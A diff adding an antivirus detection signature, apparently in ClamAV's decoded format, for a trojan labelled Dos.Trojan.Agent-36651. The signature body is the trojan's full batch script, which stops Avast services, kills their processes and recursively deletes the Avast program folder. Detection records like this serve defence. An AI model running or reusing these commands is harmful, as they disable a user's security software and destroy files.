@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36651
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off if exist "c:\archivos de programa\alwil software\avast4" (goto avast4) else (goto 13) :avast4 cd "c:\archivos de programa\alwil software\avast4" net stop "aswupdsv" net stop "ashserv" net stop "ashwebsv" net stop "ashdisp" taskkill /f /im aswupdsv.exe /im ashserv.exe /im ashwebsv.exe /im ashdisp.exe attrib -h -s -r *.* del /s /q *.* :13 exit
